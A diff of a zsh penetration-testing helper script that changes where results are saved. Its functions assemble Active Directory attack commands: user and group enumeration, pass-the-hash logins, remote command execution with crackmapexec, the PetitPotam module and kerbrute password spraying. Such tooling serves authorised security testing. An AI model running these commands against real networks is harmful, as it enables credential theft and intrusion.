@@ -54,7 +54,7 @@ nb-ad-enum-null-enum4-users() {
 	  __ask "Enter the IP address of the target DC server"
     local dc && __askvar dc DC_IP
 
-    print -z "enum4linux -U $dc | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"] | tee $(__netadpath)/enum4linux-user-enum.txt"
+    print -z "enum4linux -U $dc | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"] | tee $(__netpath)/enum4linux-user-enum.txt"
 }
 
 nb-ad-enum-auth-enum4-users() {
@@ -64,7 +64,7 @@ nb-ad-enum-auth-enum4-users() {
 	  __ask "Enter the IP address of the target DC server"
     local dc && __askvar dc DC_IP
 
-    print -z "enum4linux -u ${__USER} -p ${__PASS} -U $dc | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"] | tee $(__netadpath)/enum4linux-user-enum.txt"
+    print -z "enum4linux -u ${__USER} -p ${__PASS} -U $dc | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"] | tee $(__netpath)/enum4linux-user-enum.txt"
 }
 
 nb-ad-enum-null-cme-users() {
@@ -72,7 +72,7 @@ nb-ad-enum-null-cme-users() {
 	  __ask "Enter the IP address of the target DC server"
     local dc && __askvar dc DC_IP
 
-    print -z "crackmapexec smb $dc --users | tee $(__netadpath)/cme-users-enum.txt"
+    print -z "crackmapexec smb $dc --users | tee $(__netpath)/cme-users-enum.txt"
 }
 
 nb-ad-enum-auth-impacket-getadusers() {
@@ -84,7 +84,7 @@ nb-ad-enum-auth-impacket-getadusers() {
 	  __ask "Enter the IP address of the target DC server"
     local dc && __askvar dc DC_IP
 
-    print -z "impacket-GetADUsers -all ${__DOMAIN}/${__USER}:'${__PASS}' -dc-ip $dc -outputfile $(__domadpath)/adusers.txt"
+    print -z "impacket-GetADUsers -all ${__DOMAIN}/${__USER}:'${__PASS}' -dc-ip $dc -outputfile $(__netpath)/adusers.txt"
 }
 
 nb-ad-enum-auth-cme-users() {
@@ -105,17 +105,17 @@ nb-ad-enum-auth-cme-users() {
             nb-vars-set-domain
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb $dc -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --users | tee $(__netadpath)/cme-users-enum.txt"
+            print -z "crackmapexec smb $dc -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --users | tee $(__netpath)/cme-users-enum.txt"
         else
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb $dc -u ${__USER} -p '${__PASS}' --users | tee $(__netadpath)/cme-users-enum.txt"
+            print -z "crackmapexec smb $dc -u ${__USER} -p '${__PASS}' --users | tee $(__netpath)/cme-users-enum.txt"
         fi
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
         __check-hash
-        print -z "crackmapexec smb $dc -u ${__USER} -H ${__HASH} --local-auth --users | tee $(__netadpath)/cme-users-enum.txt"
+        print -z "crackmapexec smb $dc -u ${__USER} -H ${__HASH} --local-auth --users | tee $(__netpath)/cme-users-enum.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
@@ -140,17 +140,17 @@ nb-ad-enum-auth-cme-groups() {
             nb-vars-set-domain
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb $dc -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --groups | tee $(__netadpath)/cme-groups-enum.txt"
+            print -z "crackmapexec smb $dc -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --groups | tee $(__netpath)/cme-groups-enum.txt"
         else
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb $dc -u ${__USER} -p '${__PASS}' --groups | tee $(__netadpath)/cme-groups-enum.txt"
+            print -z "crackmapexec smb $dc -u ${__USER} -p '${__PASS}' --groups | tee $(__netpath)/cme-groups-enum.txt"
         fi
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
         __check-hash
-        print -z "crackmapexec smb $dc -u ${__USER} -H ${__HASH} --local-auth --groups | tee $(__netadpath)/cme-groups-enum.txt"
+        print -z "crackmapexec smb $dc -u ${__USER} -H ${__HASH} --local-auth --groups | tee $(__netpath)/cme-groups-enum.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
@@ -174,17 +174,17 @@ nb-ad-enum-auth-cme-loggedon() {
             nb-vars-set-domain
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --loggedon-users | tee $(__netadpath)/cme-loggedon-enum.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --loggedon-users | tee $(__netpath)/cme-loggedon-enum.txt"
         else
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' --loggedon-users | tee $(__netadpath)/cme-loggedon-enum.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' --loggedon-users | tee $(__netpath)/cme-loggedon-enum.txt"
         fi
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
         __check-hash
-        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --loggedon-users | tee $(__netadpath)/cme-loggedon-enum.txt"
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --loggedon-users | tee $(__netpath)/cme-loggedon-enum.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
@@ -208,17 +208,17 @@ nb-ad-enum-auth-cme-pass-pol() {
             nb-vars-set-domain
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__RHOST} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --pass-pol | tee $(__netadpath)/cme-pass-pol.txt"
+            print -z "crackmapexec smb ${__RHOST} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --pass-pol | tee $(__netpath)/cme-pass-pol.txt"
         else
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__RHOST} -u ${__USER} -p '${__PASS}' --pass-pol | tee $(__netadpath)/cme-pass-pol.txt"
+            print -z "crackmapexec smb ${__RHOST} -u ${__USER} -p '${__PASS}' --pass-pol | tee $(__netpath)/cme-pass-pol.txt"
         fi
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
         __check-hash
-        print -z "crackmapexec smb ${__RHOST} -u ${__USER} -H ${__HASH} --local-auth --pass-pol | tee $(__netadpath)/cme-pass-pol.txt"
+        print -z "crackmapexec smb ${__RHOST} -u ${__USER} -H ${__HASH} --local-auth --pass-pol | tee $(__netpath)/cme-pass-pol.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
@@ -238,10 +238,10 @@ nb-ad-enum-kerbrute-users() {
       __ask "Select a user list"
       __askpath ul FILE $HOME/desktop/projects/
 
-      print -z "sudo kerbrute userenum -d ${__DOMAIN} --dc $dc $ul -o $(__netadpath)/kerbrute-user-enum.txt"
+      print -z "sudo kerbrute userenum -d ${__DOMAIN} --dc $dc $ul -o $(__netpath)/kerbrute-user-enum.txt"
     else
       nb-vars-set-wordlist
-      print -z "sudo kerbrute userenum -d ${__DOMAIN} --dc $dc ${__WORDLIST} -o $(__netadpath)/kerbrute-user-enum.txt"
+      print -z "sudo kerbrute userenum -d ${__DOMAIN} --dc $dc ${__WORDLIST} -o $(__netpath)/kerbrute-user-enum.txt"
     fi
 }
 
@@ -249,7 +249,7 @@ nb-ad-enum-fping() {
     __check-project
     __ask "Specify also a CIDR subnet mask e.g. /23"
     nb-vars-set-rhost
-    print -z "fping -asgq ${__RHOST} | tee $(__netadpath)/fping-check.txt"
+    print -z "fping -asgq ${__RHOST} | tee $(__netpath)/fping-check.txt"
 }
 
 nb-ad-enum-responder() {
@@ -273,7 +273,7 @@ nb-ad-enum-auth-ldapdomaindump() {
     __ask "Enter a password for authentication"
     nb-vars-set-pass
 
-    print -z "ldapdomaindump $dc -u "${__DOMAIN}\\${__USER}" -p "${__PASS}" -o $(__domadpath)/ldapdomaindump"}
+    print -z "ldapdomaindump $dc -u "${__DOMAIN}\\${__USER}" -p "${__PASS}" -o $(__netpath)/ldapdomaindump"}
     __info "Output saved in 'ldapdomaindump' directory"
 }
 
@@ -287,7 +287,7 @@ nb-ad-enum-auth-bloodhound() {
     __ask "Enter a password for authentication"
     nb-vars-set-pass
 
-    #pushd $(__domadpath) &> /dev/null
+    #pushd $(__netpath) &> /dev/null
     print -z "sudo bloodhound-python -d ${__DOMAIN} -u ${__USER} -p '${__PASS}' -ns $dc -c all"
     __info "Output saved in 'bloodhound' directory"
     __info "You can zip the .json files together to upload to bloodhound GUI using command:"
@@ -312,17 +312,17 @@ nb-ad-enum-auth-cme-pass() {
             nb-vars-set-domain
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' | tee $(__netadpath)/cme-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' | tee $(__netpath)/cme-sweep.txt"
         else
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' | tee $(__netadpath)/cme-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' | tee $(__netpath)/cme-sweep.txt"
         fi
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
         __check-hash
-        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth | tee $(__netadpath)/cme-sweep.txt"
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth | tee $(__netpath)/cme-sweep.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
@@ -349,17 +349,17 @@ nb-ad-enum-auth-cme-command() {
             nb-vars-set-domain
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -x $cm | tee $(__netadpath)/cme-command-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -x $cm | tee $(__netpath)/cme-command-sweep.txt"
         else
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' -x $cm | tee $(__netadpath)/cme-command-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' -x $cm | tee $(__netpath)/cme-command-sweep.txt"
         fi
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
         __check-hash
-        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -x $cm | tee $(__netadpath)/cme-command-sweep.txt"
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -x $cm | tee $(__netpath)/cme-command-sweep.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
@@ -383,17 +383,17 @@ nb-ad-enum-auth-cme-petipotam() {
             nb-vars-set-domain
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -M petipotam | tee $(__netadpath)/cme-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -M petipotam | tee $(__netpath)/cme-sweep.txt"
         else
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' -M petipotam | tee $(__netadpath)/cme-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' -M petipotam | tee $(__netpath)/cme-sweep.txt"
         fi
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
         __check-hash
-        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M petipotam | tee $(__netadpath)/cme-sweep.txt"
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M petipotam | tee $(__netpath)/cme-sweep.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
@@ -471,7 +471,7 @@ nb-ad-enum-pass-spray() {
 	  __ask "Enter the password for spraying"
     local pw && __askvar pw PASSWORD
 
-    print -z "kerbrute passwordspray -d ${__DOMAIN} --dc $dc $ul $pw -o $(__netadpath)/kerbrute-password-spray.txt"
+    print -z "kerbrute passwordspray -d ${__DOMAIN} --dc $dc $ul $pw -o $(__netpath)/kerbrute-password-spray.txt"
 }
 
 nb-ad-enum-brute-cme() {
